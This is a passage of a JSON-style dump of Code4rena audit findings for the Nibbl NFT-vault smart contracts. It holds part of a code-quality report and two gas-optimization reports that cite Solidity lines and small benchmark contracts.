contracts/NibblVault.sol   #1  /// @audit onERC721Received(), onERC1155Received() 20:   contract NibblVault is INibblVault, BancorFormula, ERC20Upgradeable, Twav, EIP712Base { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L20  ### 6. `require()`/`revert()` statements should have descriptive reason strings  *There is 1 instance of this issue:* ```solidity File: contracts/NibblVaultFactory.sol   #1  114:          require(_success); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L114  ### 7. `public` functions not called by the contract should be declared `external` instead Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.  *There are 3 instances of this issue:* ```solidity File: contracts/NibblVaultFactory.sol   #1  64        function getVaultAddress( 65            address _curator, 66            address _assetAddress, 67            uint256 _assetTokenID, 68            uint256 _initialSupply, 69:           uint256 _initialTokenPrice) public view returns(address _vault) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L64-L69  ```solidity File: contracts/NibblVaultFactory.sol   #2  76:       function getVaults() public view returns(ProxyVault[] memory ) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L76  ```solidity File: contracts/Twav/Twav.sol   #3  44:       function getTwavObservations() public view returns(TwavObservation[TWAV_BLOCK_NUMBERS] memory) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L44  ### 8. Non-assembly method available  `assembly{ id := chainid() }` => `uint256 id = block.chainid`, `assembly { size := extcodesize() }` => `uint256 size = address().code.length`  *There is 1 instance of this issue:* ```solidity File: contracts/Utilities/EIP712Base.sol   #1  29:               id := chainid() ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L29  ### 9. `2**<n> - 1` should be re-written as `type(uint<n>).max` Earlier versions of solidity can use `uint<n>(-1)` instead. Expressions not including the `- 1` can often be re-written to accomodate the change (e.g. by using a `>` rather than a `>=`, which will also save some gas)  *There are 4 instances of this issue:* ```solidity File: contracts/NibblVault.sol   #1  303:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L303  ```solidity File: contracts/NibblVault.sol   #2  365:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L365  ```solidity File: contracts/NibblVault.sol   #3  413:          _updateTWAV(_currentValuation, uint32(block.timestamp % 2**32)); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L413  ```solidity File: contracts/NibblVault.sol   #4  445:          uint32 _blockTimestamp = uint32(block.timestamp % 2**32); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L445  ### 10. `constant`s should be defined rather than using magic numbers Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals  *There are 10 instances of this issue:* ```solidity File: contracts/NibblVaultFactory.sol  /// @audit 0xff 72:           bytes32 _hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code)));  /// @audit 0xff 91:           bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code))); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L72  ```solidity File: contracts/NibblVault.sol  /// @audit 1e18 183:          uint32 _secondaryReserveRatio = uint32((msg.value * SCALE * 1e18) / (_initialTokenSupply * _initialTokenPrice));  /// @audit 1e18 195:          uint _primaryReserveBalance = (primaryReserveRatio * _initialTokenSupply * _initialTokenPrice) / (SCALE * 1e18);  /// @audit 1e18 226:          secondaryReserveRatio = uint32((secondaryReserveBalance * SCALE * 1e18) / (initialTokenSupply * initialTokenPrice)); //secondaryReserveRatio is updated on every trade   /// @audit 1e18 253:              return ((secondaryReserveRatio * initialTokenSupply * initialTokenPrice) / (1e18 * SCALE));  /// @audit 32 303:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);  /// @audit 32 365:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);  /// @audit 32 413:          _updateTWAV(_currentValuation, uint32(block.timestamp % 2**32));  /// @audit 32 445:          uint32 _blockTimestamp = uint32(block.timestamp % 2**32); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L183  ### 11. Cast is more restrictive than the type of the variable being assigned If `address foo` is being used in an expression such as `IERC20 token = FooToken(foo)`, then the more specific cast to `FooToken` is a waste because the only thing the compiler will check for is that `FooToken` extends `IERC20` - it won't"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/125", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "**Overview**  Risk Rating | Number of issues --- | --- Gas Issues | 19  **Table of Contents:**  - [1. Use of the `memory` keyword when `storage` should be used](#1-use-of-the-memory-keyword-when-storage-should-be-used) - [2. Unchecking arithmetics operations that can't underflow/overflow](#2-unchecking-arithmetics-operations-that-cant-underflowoverflow) - [3. Caching storage values in memory](#3-caching-storage-values-in-memory) - [4. Cheap Contract Deployment Through Clones](#4-cheap-contract-deployment-through-clones) - [5. Reduce the size of error messages (Long revert Strings)](#5-reduce-the-size-of-error-messages-long-revert-strings) - [6. SafeMath is not needed when using Solidity version 0.8+](#6-safemath-is-not-needed-when-using-solidity-version-08) - [7. Duplicated conditions should be refactored to a modifier or function to save deployment costs](#7-duplicated-conditions-should-be-refactored-to-a-modifier-or-function-to-save-deployment-costs) - [8. Internal/Private functions only called once can be inlined to save gas](#8-internalprivate-functions-only-called-once-can-be-inlined-to-save-gas) - [9. `>=` is cheaper than `>` (and `<=` cheaper than `<`)](#9--is-cheaper-than--and--cheaper-than-) - [10. Splitting `require()` statements that use `&&` saves gas](#10-splitting-require-statements-that-use--saves-gas) - [11. Using private rather than public for constants saves gas](#11-using-private-rather-than-public-for-constants-saves-gas) - [12. Amounts should be checked for 0 before calling a transfer](#12-amounts-should-be-checked-for-0-before-calling-a-transfer) - [13. `<array>.length` should not be looked up in every loop of a `for-loop`](#13-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop) - [14. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)](#14-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1) - [15. Increments/decrements can be unchecked in for-loops](#15-incrementsdecrements-can-be-unchecked-in-for-loops) - [16. Public functions to external](#16-public-functions-to-external) - [17. It costs more gas to initialize variables with their default value than letting the default value be applied](#17-it-costs-more-gas-to-initialize-variables-with-their-default-value-than-letting-the-default-value-be-applied) - [18. Use Custom Errors instead of Revert Strings to save Gas](#18-use-custom-errors-instead-of-revert-strings-to-save-gas) - [19. Functions guaranteed to revert when called by normal users can be marked `payable`](#19-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable)  ## 1. Use of the `memory` keyword when `storage` should be used  Here, the `storage` keyword should be used instead of `memory`:  ```diff File: Twav.sol 35:     function _getTwav() internal view returns(uint256 _twav){ 36:         if (twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp != 0) { 37:             uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS; - 38:             TwavObservation memory _twavObservationCurrent = twavObservations[(_index)]; + 38:             TwavObservation storage _twavObservationCurrent = twavObservations[(_index)]; - 39:             TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS]; + 39:             TwavObservation storage _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS]; 40:             _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp); 41:         } 42:     } ```  ## 2. Unchecking arithmetics operations that can't underflow/overflow  Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>  Consider wrapping with an `unchecked` block here:  - File: NibblVault.sol  ```diff 311:         if (_totalSupply >= _initialTokenSupply) { ... 313:         } else { ... - 319:                 _purchaseReturn = _initialTokenSupply - _totalSupply;  + 319:                 unchecked { _purchaseReturn = _initialTokenSupply - _totalSupply; } ```  ```diff 373:         if(_totalSupply > _initialTokenSupply) { ... - 378:                 uint256 _tokensPrimaryCurve = _totalSupply - _initialTokenSupply; + 378:                 unchecked { uint256 _tokensPrimaryCurve = _totalSupply - _initialTokenSupply; } ```  ```diff 414:         if (_buyoutBid > _currentValuation) { - 415:             safeTransferETH(payable(msg.sender), (_buyoutBid - _currentValuation)); + 415:             unchecked { safeTransferETH(payable(msg.sender), (_buyoutBid - _currentValuation) }); ```  ## 3. Caching storage values in memory  The code can be optimized by minimising the number of SLOADs.  SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.  See the `@audit` tags for details about the multiple SLOADs where a cached value should be used instead of `SLOAD 2` and above:  - `twavObservationsIndex`: <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L27-L29>  ```solidity File: Twav.sol 27:         uint256 _prevCumulativeValuation = twavObservations[((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS].cumulativeValuation; 28:         twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative 29:         twavObservationsIndex = (twavObservationsIndex + 1) % TWAV_BLOCK_NUMBERS; ```  - `secondaryReserveBalance`: <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L222-L226>  ```solidity File: NibblVault.sol 222:         uint256 _maxSecondaryBalanceIncrease = fictitiousPrimaryReserveBalance - secondaryReserveBalance; ... 226:         secondaryReserveRatio = uint32((secondaryReserveBalance * SCALE * 1e18) / (initialTokenSupply * initialTokenPrice)); //secondaryReserveRatio is updated on every trade  ```  - `secondaryReserveBalance`: <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L314-L320>  ```solidity File: NibblVault.sol 314:             uint256 _lowerCurveDiff = getMaxSecondaryCurveBalance() - secondaryReserveBalance; ... 320:                 secondaryReserveBalance += _lowerCurveDiff; ```  - `primaryReserveBalance`: <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L379-L380>  ```solidity File: NibblVault.sol 379:                 _saleReturn = primaryReserveBalance - fictitiousPrimaryReserveBalance; 380:                 primaryReserveBalance -= _saleReturn; ```  - `basketUpdateTime`: <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107>  ```solidity File: NibblVaultFactory.sol 107:         require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  - `feeToUpdateTime`: <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131>  ```solidity File: NibblVaultFactory.sol 131:         require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  - `vaultUpdateTime`: <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166>  ```solidity File: NibblVaultFactory.sol 166:         require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  ## 4. Cheap Contract Deployment Through Clones  See `@audit` tag:  ```solidity 67:     function _executeTransfer(address _owner, uint256 _idx) internal { 68:         (bytes32 salt, ) = precompute(_owner, _idx); 69:         new FlashEscrow{salt: salt}( //@audit gas: deployment can cost less through clones 70:             nftAddress, 71:             _encodeFlashEscrowPayload(_idx) 72:         ); 73:     } ```  ```solidity NibblVaultFactory.sol:50:        _proxyVault = payable(new ProxyVault{salt: keccak256(abi.encodePacked(_curator, _assetAddress, _assetTokenID, _initialSupply, _initialTokenPrice))}(payable(address(this)))); NibblVaultFactory.sol:81:        address payable _basketAddress = payable(new ProxyBasket{salt: keccak256(abi.encodePacked(_curator, _mix))}(basketImplementation)); ```  There's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .  This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:  - <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516> - <https://github.com/porter-finance/v1-core/pull/34>  Consider applying a similar pattern, here with a `cloneDeterministic` method to mimic the current `create2`  ## 5. Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  Revert strings > 32 bytes:  ```solidity NibblVaultFactory.sol:48:        require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\"); NibblVaultFactory.sol:49:        require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\"); NibblVaultFactory.sol:107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); NibblVaultFactory.sol:131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); NibblVaultFactory.sol:141:        require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\"); NibblVaultFactory.sol:149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); NibblVaultFactory.sol:166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  Consider shortening the revert strings to fit in 32 bytes.  ## 6. SafeMath is not needed when using Solidity version 0.8+  Solidity version 0.8+ already implements overflow and underflow checks by default. Using the SafeMath library from OpenZeppelin (which is more gas expensive than the 0.8+ overflow checks) is therefore redundant.  Consider using the built-in checks instead of SafeMath and remove SafeMath here:  ```solidity NibblVaultFactory.sol:3:pragma solidity 0.8.10; NibblVaultFactory.sol:9:import { SafeMath } from  \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; ```  ## 7. Duplicated conditions should be refactored to a modifier or function to save deployment costs  ```solidity Basket.sol:36:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); Basket.sol:42:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); Basket.sol:53:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); Basket.sol:62:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); Basket.sol:69:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); Basket.sol:79:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); Basket.sol:86:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); Basket.sol:92:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ```  ```solidity NibblVault.sol:475:        require(msg.sender == curator,\"NibblVault: Only Curator\"); NibblVault.sol:486:        require(msg.sender == curator,\"NibblVault: Only Curator\"); ```  ```solidity NibblVault.sol:496:        require(msg.sender == bidder,\"NibblVault: Only winner\"); NibblVault.sol:505:        require(msg.sender == bidder,\"NibblVault: Only winner\"); NibblVault.sol:516:        require(msg.sender == bidder, \"NibblVault: Only winner\"); NibblVault.sol:524:        require(msg.sender == bidder, \"NibblVault: Only winner\"); NibblVault.sol:536:        require(msg.sender == bidder, \"NibblVault: Only winner\"); NibblVault.sol:546:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ```  ## 8. Internal/Private functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra `JUMP` instructions and additional stack operations needed for function calls.  Affected code:  - `NibblVault.sol#getMaxSecondaryCurveBalance()` ```solidity contracts/NibblVault.sol:   252:     function getMaxSecondaryCurveBalance() private view returns(uint256){   314:             uint256 _lowerCurveDiff = getMaxSecondaryCurveBalance() - secondaryReserveBalance; ```  ## 9. `>=` is cheaper than `>` (and `<=` cheaper than `<`)  Strict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas). This also holds true between `<=` and `<`.    Consider replacing strict inequalities with non-strict ones to save some gas here:  ```solidity NibblVault.sol:224:        _feeCurve = _maxSecondaryBalanceIncrease > _feeCurve ? _feeCurve : _maxSecondaryBalanceIncrease; // the curve fee is capped so that secondaryReserveBalance <= fictitiousPrimaryReserveBalance ```  ## 10. Splitting `require()` statements that use `&&` saves gas  If you're using the Optimizer at 200, instead of using the `&&` operator in a single require statement to check multiple conditions, Consider using multiple require statements with 1 condition per require statement:  ```solidity NibblVaultFactory.sol:107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); NibblVaultFactory.sol:131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); NibblVaultFactory.sol:149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); NibblVaultFactory.sol:166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  Please, note that this might not hold true at a higher number of runs for the Optimizer (10k). However, it indeed is true at 200.  ## 11. Using private rather than public for constants saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ```solidity Utilities/AccessControlMechanism.sol:12:    bytes32 public constant FEE_ROLE = keccak256(\"FEE_ROLE\"); Utilities/AccessControlMechanism.sol:13:    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\"); Utilities/AccessControlMechanism.sol:14:    bytes32 public constant IMPLEMENTER_ROLE = keccak256(\"IMPLEMENTER_ROLE\"); Utilities/NibblVaultFactoryData.sol:7:    uint256 public constant MAX_ADMIN_FEE = 10_000; //1%  ```  ## 12. Amounts should be checked for 0 before calling a transfer  Checking non-zero transfer values can avoid an expensive external call and save gas (especially in loops, like in `NibblVault.sol#withdrawMultipleERC20()`).    Consider adding a non-zero-value check here:  ```solidity   Basket.sol:80:        _to.transfer(address(this).balance); Basket.sol:87:        IERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this))); Basket.sol:94:            IERC20(_tokens[i]).transfer(msg.sender, IERC20(_tokens[i]).balanceOf(address(this))); NibblVault.sol:517:        IERC20(_asset).transfer(_to, IERC20(_asset).balanceOf(address(this))); NibblVault.sol:526:            IERC20(_assets[i]).transfer(_to, IERC20(_assets[i]).balanceOf(address(this))); ```    ## 13. `<array>.length` should not be looked up in every loop of a `for-loop`  Reading array length at each iteration of the loop consumes more gas than necessary.    In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Here, Consider storing the array's length in a variable before the for-loop, and use this new variable instead:  ```solidity Basket.sol:43:        for (uint256 i = 0; i < _tokens.length; i++) { Basket.sol:70:        for (uint256 i = 0; i < _tokens.length; i++) { Basket.sol:93:        for (uint256 i = 0; i < _tokens.length; i++) { NibblVault.sol:506:        for (uint256 i = 0; i < _assetAddresses.length; i++) { NibblVault.sol:525:        for (uint256 i = 0; i < _assets.length; i++) { NibblVault.sol:547:        for (uint256 i = 0; i < _assets.length; i++) { ```  ## 14. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:  ```solidity uint i = 1;   uint j = 2; require(j == i++, \"This will be false as i is incremented after the comparison\"); ```    However, pre-increments (or pre-decrements) return the new value:    ```solidity uint i = 1;   uint j = 2; require(j == ++i, \"This will be true as i is incremented before the comparison\"); ```    In the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.      Affected code:    ```solidity Basket.sol:43:        for (uint256 i = 0; i < _tokens.length; i++) { Basket.sol:70:        for (uint256 i = 0; i < _tokens.length; i++) { Basket.sol:93:        for (uint256 i = 0; i < _tokens.length; i++) { NibblVault.sol:506:        for (uint256 i = 0; i < _assetAddresses.length; i++) { NibblVault.sol:525:        for (uint256 i = 0; i < _assets.length; i++) { NibblVault.sol:547:        for (uint256 i = 0; i < _assets.length; i++) { ```  Consider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).  ## 15. Increments/decrements can be unchecked in for-loops  In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.      [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)  Affected code:    ```solidity Basket.sol:43:        for (uint256 i = 0; i < _tokens.length; i++) { Basket.sol:70:        for (uint256 i = 0; i < _toke"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "### [G01] Public Functions that can be External  The following functions are never called in their contracts and can be switched to external to save gas: [NibblVaultFactory.sol#L64-L69](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L64-L69) [NibblVaultFactory.sol#L76](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L76) [NibblVaultFactory.sol#L80](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L80) [NibblVaultFactory.sol#L88](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L88) [Twav.sol#L44](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L44)   ### [G02] Unchecked Increments in Loops  When incrementing i in for loops there is no chance of overflow so unchecked can be used to save gas. I ran a simple test in remix and found deployment savings of 31,653 gas and on each function call saved ~141 gas per iteration.  ``` contract Test {  function loopTest() external {   for (uint256 i; i < 1; ++i) {   Deployment Cost: 125,637, Cost on function call: 24,601   vs   for (uint256 i; i < 1; ) {   // for loop body   unchecked { ++i }   Deployment Cost: 93,984, Cost on function call: 24,460   }  } } ```  For loops that can use unchecked increments: [NibblVault.sol#L506](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506) [NibblVault.sol#L525](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L525) [NibblVault.sol#L547](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L547) [Basket.sol#L43](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43) [Basket.sol#L70](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L70) [Basket.sol#L93](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L93)   ### [G03] Pre Increments in Loops  In for loops pre increments can also be used to save a small amount of gas per iteration. I ran a test in remix using a for loop and found the deployment savings of 497 gas and ~5 gas per iteration.  ``` contract Test {  function loopTest() external {   for (uint256 i; i < 1; i++) {   (Deployment cost: 118,408, Cost on function call: 24,532)   vs   for (uint256 i; i < 1; ++i) {   (Deployment cost: 117,911, Cost on function call: 24,527)   }  } } ```  For loops that can use pre increments: [NibblVault.sol#L506](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506) [NibblVault.sol#L525](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L525) [NibblVault.sol#L547](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L547) [Basket.sol#L43](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43) [Basket.sol#L70](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L70) [Basket.sol#L93](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L93)   ### [G04] Custom Errors As your using a solidity version > 0.8.4 for most of the contracts you can replace revert strings with custom errors. This will save in deployment costs and runtime costs. I ran a test in remix comparing a revert string vs custom errors and found that replacing a single revert string with a custom error saved 12,404 gas in deployment cost and 86 gas on each function call.   ``` contract Test {  uint256 a;  function check() external {   require(a != 0, \"check failed\");  } }   (Deployment cost: 114,703, Cost on Function call: 23,392) vs  contract Test {  uint256 a;  error checkFailed();  function check() external {   if (a != 0) revert checkFailed();  } }   (Deployment cost: 102,299, Cost on Function call: 23,306) ```  There are 41 revert strings throughout your contracts that can be replaced with custom errors.   ### [G05] Long Revert Strings  If you opt not to use custom errors keeping revert strings <= 32 bytes in length will save gas.  I ran a test in remix and found the savings for a single short revert string vs long string to be 9,377 gas in deployment cost and 18 gas on function call.  ``` contract Test {  uint256 a;  function check() external {   require(a != 0, \"short error message\");    (Deployment cost: 114,799, Cost on function call: 23,392)    vs    require(a != 0, \"A longer Error Message over 32 bytes in              length\");    (Deployment cost: 124,176, Cost on function call: 23,410)   } } ```  I recommend shortenning the following revert strings to < 32 bytes in length: [NibblVaultFactory.sol#L48-L49](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L48-L49) [NibblVaultFactory.sol#L107](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107) [NibblVaultFactory.sol#L131](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131) [NibblVaultFactory.sol#L141](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L141) [NibblVaultFactory.sol#L149](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149) [NibblVaultFactory.sol#L166](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166)   ### [G06] && in Require Statements  If optimising for runtime costs over deployment costs you can seperate && in require functions into 2 parts. I ran a basic test in remix and it cost an extra 234 gas to deploy but will save ~9 gas everytime the require function is called.  ``` contract Test {  uint256 a = 0;  uint256 b = 1;   function test() external {   require(a == 0 && b > a)    (Deployment cost: 123,291, Cost on function call: 29,371)   vs   require(a == 0);   require(b > a);   (Deployment cost: 123,525, Cost on function call: 29,362)  } } ```  Require statements that can be split up: [NibblVaultFactory.sol#L107](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107) [NibblVaultFactory.sol#L131](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131) 